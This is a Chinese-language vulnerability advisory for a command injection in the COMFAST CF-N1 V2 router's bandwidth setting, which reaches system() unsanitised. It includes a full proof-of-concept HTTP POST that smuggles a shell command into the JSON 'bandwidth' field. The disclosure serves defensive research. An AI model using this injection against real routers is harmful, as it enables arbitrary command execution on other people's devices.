## Comfast CF-N1 Router

- **供应商**：COMFAST

- **产品**：COMFAST CF-N1 V2

- **固件版本**：V2.6.0.2

- **漏洞**：命令注入

### 概述

COMFAST CF-N1 V2 V2.6.0 Router中发现了一个命令注入漏洞，攻击者可以通过发送恶意 HTTP POST 数据包来利用该漏洞执行任意命令。当请求路径为 `/cgi-bin/mbox-config?method=SET&section=ptest_bandwidth` 时，该漏洞可被触发，要求用户登录获取到cookie。

### 漏洞详情

触发点位于`webmggnt` 组件中的`sub_44AC4C`方法，此处对于`bandwidth`字段没有校验就使用`sprintf` 进行了拼接，并使用`system`执行。

![](../main/images/2026-01-29-16-53-39-image.png)

### 概念验证

```http
POST /cgi-bin/mbox-config?method=SET&section=ptest_bandwidth HTTP/1.1

Host: 192.168.0.30

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: appliation/json

X-Requested-With: XMLHttpRequest

Content-Length: 39

Origin: http://192.168.0.30

Connection: close

Referer: http://192.168.0.30/wifi/wifi_time.html

Cookie: COMFAST_SESSIONID=c0a80002-4261ffffffc85cffffff8a5f-327b23c6

Priority: u=0



{"bandwidth":"aaa;echo 1 > /tmp/1.txt"}
```

![](../main/images/2026-01-29-16-57-42-8ba3cce4-7ddf-454f-9da0-e7966c6b9b42.png)



